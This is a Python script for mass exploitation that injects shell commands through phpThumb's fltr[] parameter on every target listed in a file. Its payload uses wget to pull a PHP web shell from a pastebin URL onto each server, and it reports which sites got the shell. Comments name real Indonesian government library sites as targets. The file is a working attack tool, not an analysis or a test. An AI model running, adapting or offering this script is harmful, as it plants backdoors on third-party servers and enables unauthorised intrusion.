import requests, re, sys, base64
from multiprocessing import Pool
from multiprocessing.dummy import Pool as ThreadPool
Thread_ = 20 #Thread

#ex: http://digilib.batan.go.id/psta/libpsta//lib/watermark/phpThumb.php?src=file.jpg&fltr[]=blur|9%20-quality%2075%20-interlaceline%20file.jpg%20jpeg:file.jpg%20;ls%20-la;%20&phpThumbDebug=9
#ex: http://perpustakaan.ptun-jakarta.go.id///lib/watermark/phpThumb.php?src=file.jpg&fltr[]=blur|9%20-quality%2075%20-interlaceline%20file.jpg%20jpeg:file.jpg%20;ls%20-la;%20&phpThumbDebug=9
#exploit = '/lib/watermark/phpThumb.php?src=file.jpg&fltr[]=blur|9%20-quality%2075%20-interlaceline%20file.jpg%20jpeg:file.jpg%20;ls%20-la;%20&phpThumbDebug=9'
#target = 'http://perpustakaan.ptun-jakarta.go.id/'
#exploit= 'lib/watermark/phpThumb.php?src=file.jpg&fltr[]=blur|9%20-quality%2075%20-interlaceline%20file.jpg%20jpeg:file.jpg%20;wget site.com -O shell.php;%20&phpThumbDebug=9'
exploit = 'lib/watermark/phpThumb.php?src=file.jpg&fltr[]=blur|9%20-quality%2075%20-interlaceline%20file.jpg%20jpeg:file.jpg%20;wget%20-O%20xxx.php%20https://pastebin.com/raw/JgDhgE0c;ls%20-la;cat%20xxx.php;%20&phpThumbDebug=9'
#target = 'http://pustaka.pn-calang.go.id/'
shell = '/xxx.php'
def zeerx7():
   print(base64.decodestring('DQrDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDlyAgICAgICAgIEF1dG8gdXBsb2FkIHNoZWxsIHBocFRodW1iIGNvbW1hbmQgaW5qZWN0aW9uDQrDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDlw0K'))

def xsec(target):
   try:
     u = ceku(target)
     pausi = u+'/'+exploit
     r = requests.get(pausi)
     if 'Uploader by Zeerx7' in r.text:
         print("Vuln! [Shell Uploaded] "+u+shell)
     else:
         print("Not Vuln "+u)
   except:
      print('error')

def main():
    xx = []
    l = list(sys.argv[1])
    for j in l:
      if j:
        xx.append(j)

    #print(xx)
    #f = ['http://pustaka.pn-calang.go.id']
    if xx:
        pool = ThreadPool(Thread_)
	pool.map(xsec, xx)
        pool.close()
	pool.join()
        #xsec(f[0])

def ceku(u):
   if 'http://' in u or 'https://' in u:
      pass
   else:
      u = 'http://'+u

   return u

def list(list):
   f=open(list,'r')
   kontent=f.read()
   return kontent.split('\n')

if __name__ == '__main__':
    zeerx7()
    try:
        if len(sys.argv) < 2:
 	    print("Usage : python run.py target.txt\n")
	else:
	    main()
    except:
        print('Error')
